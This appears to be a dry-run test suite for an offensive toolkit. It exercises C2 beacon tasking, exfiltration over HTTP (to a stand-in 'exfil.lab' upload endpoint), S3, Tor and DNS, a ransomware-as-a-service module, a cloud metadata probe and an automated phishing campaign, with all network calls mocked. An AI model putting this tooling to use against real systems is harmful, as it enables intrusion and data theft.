/**
 * Audit gap fixes (34ff2a8a) — passive intel live APIs, C2 task dispatch, exfil channels.
 */
import { describe, test, beforeEach, afterEach, mock } from "node:test"
import assert from "node:assert/strict"
import * as fs from "node:fs"
import * as path from "node:path"
import { fileURLToPath } from "node:url"

const ENV_BACKUP = { ...process.env }
const CACHE_DIR = path.resolve(
  path.dirname(fileURLToPath(import.meta.url)),
  "../data/intel/cache",
)

beforeEach(() => {
  process.env = { ...ENV_BACKUP, OURMINE_ALLOW_DRY_RUN: "1", OURMINE_LIVE: "0" }
})

afterEach(() => {
  process.env = ENV_BACKUP
  mock.restoreAll()
})

describe("passive intel live APIs", () => {
  test("no API keys returns empty hits (no fake stub banners)", async () => {
    process.env.OURMINE_PASSIVE_INTEL = "1"
    delete process.env.SHODAN_API_KEY
    delete process.env.CENSYS_API_ID
    delete process.env.CENSYS_API_SECRET

    const target = `no-keys-${Date.now()}.example.com`
    const { runPassiveIntel } = await import("../src/passive_intel.ts")
    const r = await runPassiveIntel(target, { live: false, forceRefresh: true })
    assert.equal(r.enabled, true)
    assert.equal(r.hits.length, 0)
    assert.ok(r.summary.includes("SHODAN_API_KEY") || r.summary.includes("no passive intel cache"))
    assert.ok(!r.hits.some((h) => h.banner?.includes("stub")))
  })

  test("fetchShodan parses host API response (mocked fetch)", async () => {
    process.env.SHODAN_API_KEY = "test-key"
    const originalFetch = globalThis.fetch
    globalThis.fetch = async (url) => {
      assert.match(String(url), /api\.shodan\.io\/shodan\/host\/1\.2\.3\.4/)
      return {
        ok: true,
        status: 200,
        json: async () => ({
          ip_str: "1.2.3.4",
          data: [{ port: 443, product: "nginx", transport: "tcp", data: "HTTP/1.1 200 OK" }],
        }),
      }
    }

    try {
      const { fetchShodan } = await import("../src/passive_intel.ts")
      const hits = await fetchShodan("1.2.3.4")
      assert.equal(hits.length, 1)
      assert.equal(hits[0].source, "shodan")
      assert.equal(hits[0].port, 443)
      assert.equal(hits[0].service, "nginx")
      assert.ok(hits[0].tags?.includes("shodan-live"))
    } finally {
      globalThis.fetch = originalFetch
    }
  })

  test("fetchCensys parses search response (mocked fetch)", async () => {
    process.env.CENSYS_API_ID = "id"
    process.env.CENSYS_API_SECRET = "secret"
    const originalFetch = globalThis.fetch
    globalThis.fetch = async (url, init) => {
      assert.match(String(url), /search\.censys\.io\/api\/v2\/hosts\/search/)
      assert.equal(init?.method, "POST")
      assert.match(String(init?.headers?.Authorization ?? ""), /^Basic /)
      return {
        ok: true,
        status: 200,
        json: async () => ({
          result: {
            hits: [{
              ip: "203.0.113.1",
              services: [{ port: 22, service_name: "SSH", banner: "OpenSSH" }],
            }],
          },
        }),
      }
    }

    try {
      const { fetchCensys } = await import("../src/passive_intel.ts")
      const hits = await fetchCensys("203.0.113.1")
      assert.equal(hits.length, 1)
      assert.equal(hits[0].source, "censys")
      assert.equal(hits[0].port, 22)
    } finally {
      globalThis.fetch = originalFetch
    }
  })

  test("runPassiveIntel live with keys writes cache via mocked fetch", async () => {
    process.env.OURMINE_PASSIVE_INTEL = "1"
    process.env.SHODAN_API_KEY = "test-key"
    const target = `live-mock-${Date.now()}.example.com`
    const cacheFile = path.join(CACHE_DIR, `passive_${target.replace(/[^a-zA-Z0-9._-]/g, "_")}.json`)

    const originalFetch = globalThis.fetch
    globalThis.fetch = async () => ({
      ok: true,
      status: 200,
      json: async () => ({ subdomains: ["www"], data: [{ type: "A", value: "1.2.3.4" }] }),
    })

    try {
      const { runPassiveIntel } = await import("../src/passive_intel.ts")
      const r = await runPassiveIntel(target, { live: true, forceRefresh: true })
      assert.ok(r.hits.length >= 1)
      assert.ok(r.sources?.includes("shodan"))
      assert.ok(fs.existsSync(cacheFile))
      const cached = JSON.parse(fs.readFileSync(cacheFile, "utf8"))
      assert.ok(cached.hits.length >= 1)
    } finally {
      globalThis.fetch = originalFetch
      try { fs.unlinkSync(cacheFile) } catch { /* skip */ }
    }
  })
})

describe("mcp_dispatch c2Execute", () => {
  test("list_beacons returns LegitC2Server sessions", async () => {
    const { c2Execute, setMcpC2ServerForTest } = await import("../src/mcp_dispatch.ts")
    const { LegitC2Server, InMemoryTransport } = await import("../src/c2_platform.ts")

    const server = new LegitC2Server()
    server.registerBeacon("beacon-test-1", new InMemoryTransport(), { host: "10.0.0.5", user: "lab" })
    setMcpC2ServerForTest(server)

    const r = await c2Execute({ action: "list_beacons" }, { live: false })
    assert.equal(r.dryRun, true)
    assert.equal(r.data.beacons, 1)
    assert.equal(r.data.agents[0].beacon_id, "beacon-test-1")
  })

  test("send_task queues command on active beacon", async () => {
    const { c2Execute, setMcpC2ServerForTest } = await import("../src/mcp_dispatch.ts")
    const { LegitC2Server, InMemoryTransport } = await import("../src/c2_platform.ts")

    const server = new LegitC2Server()
    server.registerBeacon("beacon-task-1", new InMemoryTransport(), { host: "10.0.0.6", user: "ops" })
    setMcpC2ServerForTest(server)

    const r = await c2Execute({ action: "send_task", payload: "whoami" }, { live: false })
    assert.equal(r.data.action, "send_task")
    assert.equal(r.data.beaconId, "beacon-task-1")
    assert.equal(r.data.command, "whoami")
    assert.equal(r.data.queued.status, "queued")
  })

  test("status action returns server probe envelope", async () => {
    const { c2Execute, setMcpC2ServerForTest } = await import("../src/mcp_dispatch.ts")
    const { LegitC2Server } = await import("../src/c2_platform.ts")

    setMcpC2ServerForTest(new LegitC2Server())

    const r = await c2Execute({ action: "status" }, { live: false })
    assert.equal(r.data.action, "status")
    assert.ok(r.data.probe?.kind === "legit-c2-server")
    assert.ok(r.data.status?.tasks)
  })
})

describe("mcp_dispatch exfil channels", () => {
  test("http channel calls exfiltrateHTTP", async () => {
    const { exfiltrate } = await import("../src/mcp_dispatch.ts")
    const r = await exfiltrate(
      { data: "secret=payload", channel: "http", endpoint: "https://exfil.lab/upload" },
      { live: false },
    )
    assert.equal(r.dryRun, true)
    assert.equal(r.data.channel, "http")
    assert.equal(r.data.bytes, 14)
    assert.equal(r.data.uploaded, false)
  })

  test("s3 channel delegates to raas_advanced.uploadToS3", async () => {
    const { exfiltrate } = await import("../src/mcp_dispatch.ts")
    const tmp = path.join(CACHE_DIR, `exfil_s3_${Date.now()}.json`)
    fs.writeFileSync(tmp, JSON.stringify({ leak: true }))

    const r = await exfiltrate({ data: tmp, channel: "s3" }, { live: false })
    assert.equal(r.data.channel, "s3")
    assert.ok(r.data.error?.includes("OURMINE_S3_BUCKET") || r.data.error?.includes("credentials"))
    try { fs.unlinkSync(tmp) } catch { /* skip */ }
  })

  test("tor channel delegates to raas_advanced.uploadViaTor", async () => {
    const { exfiltrate } = await import("../src/mcp_dispatch.ts")
    const tmp = path.join(CACHE_DIR, `exfil_tor_${Date.now()}.json`)
    fs.writeFileSync(tmp, JSON.stringify({ leak: true }))

    const r = await exfiltrate({ data: tmp, channel: "tor" }, { live: false })
    assert.equal(r.data.channel, "tor")
    assert.ok(r.data.error?.includes("OURMINE_TOR_UPLOAD_URL") || r.data.dryRun === true)
    try { fs.unlinkSync(tmp) } catch { /* skip */ }
  })

  test("dns channel still returns exfiltrateDNS result directly", async () => {
    const { exfiltrate } = await import("../src/mcp_dispatch.ts")
    const r = await exfiltrate({ data: "abc", channel: "dns" }, { live: false })
    assert.equal(r.dryRun, true)
    assert.ok(r.sentChunks >= 1)
  })
})

describe("live stub gap fixes (90cf78ea gaps #3 #4 #5 #8)", () => {
  test("oauth_consent_audit dry-run has patterns only, no liveProbes", async () => {
    const { auditOAuthConsent } = await import("../src/oauth_consent_audit.ts")
    const r = await auditOAuthConsent("contoso.onmicrosoft.com", { dryRun: true })
    assert.equal(r.dryRun, true)
    assert.ok(r.findings.some((f) => f.id === "consentfix-v3"))
    assert.equal(r.liveProbes, undefined)
  })

  test("oauth_consent_audit live merges HTTP probe findings (mocked fetch)", async () => {
    const originalFetch = globalThis.fetch
    globalThis.fetch = async (url) => ({
      ok: true,
      status: 200,
      text: async () => JSON.stringify({
        authorization_endpoint: "https://login.example.com/oauth2/authorize",
        issuer: String(url),
      }),
    })

    try {
      const { auditOAuthConsent } = await import("../src/oauth_consent_audit.ts")
      const r = await auditOAuthConsent("contoso.onmicrosoft.com", { live: true, dryRun: false })
      assert.equal(r.dryRun, false)
      assert.ok(Array.isArray(r.liveProbes))
      assert.ok(r.liveProbes.length >= 1)
      assert.ok(r.findings.some((f) => f.id === "consentfix-v3"))
      assert.ok(r.findings.some((f) => f.id === "oauth-authz-endpoint" || f.title.includes("OAuth endpoint")))
      assert.match(r.summary, /live probe/)
    } finally {
      globalThis.fetch = originalFetch
    }
  })

  test("helpdesk_social_auto live runs recon path with real probes", async () => {
    delete process.env.OURMINE_ALLOW_DRY_RUN
    const originalFetch = globalThis.fetch
    globalThis.fetch = async (url) => ({
      ok: false,
      status: 0,
      text: async () => "",
    })

    try {
      const { auditHelpdeskSocial } = await import("../src/helpdesk_social_auto.ts")
      const r = await auditHelpdeskSocial("no-live-probe-test.invalid", { live: true, dryRun: false })
      assert.equal(r.dryRun, false)
      assert.ok(r.liveRecon)
      assert.ok(r.findings.some((f) => f.id.startsWith("live-")))
      assert.match(r.summary, /SPF=/)
    } finally {
      process.env.OURMINE_ALLOW_DRY_RUN = "1"
      globalThis.fetch = originalFetch
    }
  })

  test("reconIdpOAuthPaths live probes well-known (mocked fetch)", async () => {
    const originalFetch = globalThis.fetch
    globalThis.fetch = async (url) => ({
      ok: String(url).includes("openid-configuration"),
      status: 200,
      text: async () => JSON.stringify({ issuer: String(url) }),
    })

    try {
      const { reconIdpOAuthPaths } = await import("../src/ares/cloud_native.ts")
      const r = await reconIdpOAuthPaths({ hint: "okta entra google", tenant: "tenant.okta.com", live: true, dryRun: false })
      assert.equal(r.dryRun, false)
      assert.ok(Array.isArray(r.wellKnownProbes))
      assert.ok(r.wellKnownProbes.some((p) => p.ok))
      assert.match(r.summary, /well-known probe/)
    } finally {
      globalThis.fetch = originalFetch
    }
  })

  test("reconIdpOAuthPaths IMDS probe when hint is cloud IP (mocked fetch)", async () => {
    const originalFetch = globalThis.fetch
    globalThis.fetch = async (url) => {
      if (String(url).includes("169.254.169.254")) {
        return { ok: true, status: 200, text: async () => "ami-id\ninstance-id\n" }
      }
      return { ok: false, status: 404, text: async () => "" }
    }

    try {
      const { reconIdpOAuthPaths } = await import("../src/ares/cloud_native.ts")
      const r = await reconIdpOAuthPaths({ hint: "169.254.169.254", live: true, dryRun: false })
      assert.equal(r.dryRun, false)
      assert.ok(r.imdsProbe)
      assert.equal(r.imdsProbe.accessible, true)
      assert.equal(r.imdsProbe.provider, "aws")
    } finally {
      globalThis.fetch = originalFetch
    }
  })

  test("social_eng_auto reconOnly skips delivery", async () => {
    delete process.env.OURMINE_ALLOW_DRY_RUN
    const originalFetch = globalThis.fetch
    globalThis.fetch = async (url) => ({
      ok: false,
      status: 0,
      text: async () => "",
    })

    try {
      const { runAutomatedCampaign, probeTargetRecon } = await import("../src/social_eng_auto.ts")
      const recon = await probeTargetRecon("no-live-probe-test.invalid", { live: true, dryRun: false })
      assert.ok(recon.webProbes.length >= 1)
      const camp = await runAutomatedCampaign({
        targetDomain: "no-live-probe-test.invalid",
        template: "assessment",
        live: true,
        reconOnly: true,
        targets: [],
      })
      assert.equal(camp.status, "RECON")
      assert.equal(camp.emailsSent, 0)
      assert.ok(!camp.landingPage)
    } finally {
      process.env.OURMINE_ALLOW_DRY_RUN = "1"
      globalThis.fetch = originalFetch
    }
  })
})
